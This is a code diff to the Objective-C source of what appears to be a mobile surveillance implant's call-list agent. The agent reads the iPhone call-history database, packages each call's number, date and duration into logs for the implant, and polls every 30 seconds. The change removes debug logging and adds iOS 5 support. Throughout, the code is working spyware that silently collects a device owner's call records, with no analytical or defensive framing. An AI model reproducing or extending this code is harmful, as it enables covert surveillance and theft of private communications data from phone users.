@@ -59,34 +59,22 @@ typedef struct _callListAdditionalHeader {
       rc = sqlite3_open(CALL_LIST_DB_3x, &db);
       if (rc)
         {
-#ifdef DEBUG
-          NSLog(@"Error while opening %@", CALL_LIST_DB_3x);
-#endif
           sqlite3_close(db);
           return NO;
         }
       
     }
-  else if (gOSMajor == 4)
+  else if (gOSMajor == 4 || gOSMajor == 5)
     {
       rc = sqlite3_open(CALL_LIST_DB_4x, &db);
       if (rc)
         {
-#ifdef DEBUG
-          NSLog(@"Error while opening %@", CALL_LIST_DB_4x);
-#endif
           sqlite3_close(db);
           return NO;
         }
     }
   else
     {
-#ifdef DEBUG
-      NSLog(@"Unsupported OS version: %d.%d.%d",
-            gOSMajor,
-            gOSMinor,
-            gOSBugFix);
-#endif
       return NO;
     }
 
@@ -102,17 +90,11 @@ typedef struct _callListAdditionalHeader {
   //
   if (mLastCallTimestamp == 0)
     {
-#ifdef DEBUG
-      NSLog(@"Getting full call list");
-#endif
       sprintf(stmt,
               "SELECT * from call");
     }
   else
     {
-#ifdef DEBUG
-      NSLog(@"Getting call list with date > %d", mLastCallTimestamp);
-#endif
       sprintf(stmt,
               "SELECT * from call where rowid > '%d'",
               mLastCallTimestamp);
@@ -133,19 +115,10 @@ typedef struct _callListAdditionalHeader {
 
   if (results != nil)
     {
-#ifdef DEBUG
-      NSLog(@"Logging %d calls", [results count]);
-#endif
-
       [self _logCallList: results];
       [self _saveLastTimestamp];
     }
-  else
-    {
-#ifdef DEBUG
-      NSLog(@"No calls found for query: %s", stmt);
-#endif
-    }
+
 
   sqlite3_close(db);
   [outerPool release];
@@ -165,16 +138,10 @@ typedef struct _callListAdditionalHeader {
 
       if ([item objectForKey: @"duration"] == nil)
         {
-#ifdef DEBUG
-          errorLog(@"duration not found");
-#endif
           continue;
         }
       if ([item objectForKey: @"date"] == nil)
         {
-#ifdef DEBUG
-          errorLog(@"date not found");
-#endif
           continue;
         }
 
@@ -183,11 +150,6 @@ typedef struct _callListAdditionalHeader {
       int64_t unixEnd   = unixStart + duration;
       int64_t started   = ((int64_t)unixStart * (int64_t)RATE_DIFF) + (int64_t)EPOCH_DIFF;
       int64_t ended     = ((int64_t)unixEnd * (int64_t)RATE_DIFF) + (int64_t)EPOCH_DIFF;
-
-#ifdef DEBUG
-      NSLog(@"unixstart: %lld", unixStart);
-      NSLog(@"unixend  : %lld", unixEnd);
-#endif
 
       callListAdditionalStruct *agentAdditionalHeader;
       NSMutableData *rawAdditionalHeader = [[NSMutableData alloc]
@@ -211,54 +173,40 @@ typedef struct _callListAdditionalHeader {
       NSString *number = [item objectForKey: @"address"];
       uint32_t len = [number lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
       int32_t prefix = CALLLIST_STRING_NUMBER | (len & 0x00FFFFFF);
-      
-#ifdef DEBUG
-      NSLog(@"properties: 0x%x", agentAdditionalHeader->properties);
-      NSLog(@"prefix: 0x%08x", prefix);
-#endif
 
       agentAdditionalHeader->size += sizeof(prefix)
                                      + len
                                      + sizeof(uint32_t) * 6; // Add empty strings
       [logData appendData: rawAdditionalHeader];
 
-      //
       // Append number
-      //
       [logData appendBytes: &prefix
                     length: sizeof(int32_t)];
       [logData appendData: [number dataUsingEncoding:
         NSUTF16LittleEndianStringEncoding]];
 
       NSMutableData *empty = [[NSMutableData alloc] initWithLength: sizeof(uint32_t)];
-      //
+      
       // Append nil name
-      //
       // prefix
       [logData appendData: empty];
       // name
       [logData appendData: empty];
 
-      //
       // Append nil name type
-      //
       // prefix
       [logData appendData: empty];
       // name type
       [logData appendData: empty];
 
-      //
       // Append nil note
-      //
       // prefix
       [logData appendData: empty];
       // note
       [logData appendData: empty];
 
       [empty release];
-#ifdef DEBUG
-      NSLog(@"logData: %@", logData);
-#endif
+
       RCSILogManager *logManager = [RCSILogManager sharedInstance];
       BOOL success = [logManager createLog: LOG_CALL_LIST
                                agentHeader: nil
@@ -266,12 +214,8 @@ typedef struct _callListAdditionalHeader {
 
       if (success == NO)
         {
-#ifdef DEBUG
-          NSLog(@"Error while creating log for call list");
-#endif
           [logData release];
           [rawAdditionalHeader release];
-
           continue;
         }
 
@@ -279,10 +223,6 @@ typedef struct _callListAdditionalHeader {
                             forAgent: LOG_CALL_LIST
                            withLogID: 0] == FALSE)
         {
-#ifdef DEBUG
-          NSLog(@"An error occurred while writing data for call list");
-#endif
-
           [logData release];
           [rawAdditionalHeader release];
           continue;
@@ -303,9 +243,6 @@ typedef struct _callListAdditionalHeader {
 
   if (mLastCallTimestamp == 0)
     {
-#ifdef DEBUG
-      NSLog(@"Not saving mLastCallTimestamp (is zero)");
-#endif
       return;
     }
   
@@ -330,17 +267,11 @@ typedef struct _callListAdditionalHeader {
   
   if (agentDict == nil) 
     {
-#ifdef DEBUG
-      NSLog(@"No timestamp saved from last session");
-#endif
       return NO;
     }
   else 
     {
       mLastCallTimestamp = [[agentDict objectForKey: @"CL_LAST"] unsignedIntValue];
-#ifdef DEBUG
-      NSLog(@"Found timestamp from last session: %d", mLastCallTimestamp);
-#endif  
     }
 
   [outerPool release];
@@ -363,9 +294,7 @@ typedef struct _callListAdditionalHeader {
   {
     if (sharedAgentCallList == nil)
       {
-        //
         // Assignment is not done here
-        //
         [[self alloc] init];
       }
   }
@@ -381,9 +310,7 @@ typedef struct _callListAdditionalHeader {
       {
         sharedAgentCallList = [super allocWithZone: aZone];
         
-        //
         // Assignment and return on first allocation
-        //
         return sharedAgentCallList;
       }
   }
@@ -447,26 +374,22 @@ typedef struct _callListAdditionalHeader {
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
 
-#ifdef DEBUG
-  NSLog(@"Agent CallList started");
-#endif
-
-  [mAgentConfiguration setObject: AGENT_RUNNING
-                          forKey: @"status"];
+  [mAgentConfiguration setObject: AGENT_RUNNING forKey: @"status"];
   
   while ([mAgentConfiguration objectForKey: @"status"]    != AGENT_STOP
          && [mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED)
     {
       NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
 
-      if ([self _getCallList] == NO)
+      [self _getCallList];
+      
+      for (int i=0; i<30; i++) 
         {
-#ifdef DEBUG
-          NSLog(@"Error on get call list");
-#endif
+          sleep(1);
+          if ([mAgentConfiguration objectForKey: @"status"] == AGENT_STOP)
+            break;
         }
-
-      sleep(30);
+        
       [innerPool release];
     }
   
@@ -475,6 +398,9 @@ typedef struct _callListAdditionalHeader {
       [mAgentConfiguration setObject: AGENT_STOPPED
                               forKey: @"status"];
     }
+  
+  [mAgentConfiguration release];
+  mAgentConfiguration = nil;
   
   [outerPool release];
 }
@@ -493,10 +419,6 @@ typedef struct _callListAdditionalHeader {
       sleep(1);
     }
 
-#ifdef DEBUG
-  NSLog(@"Agent CallList stopped");
-#endif
-  
   return YES;
 }
 
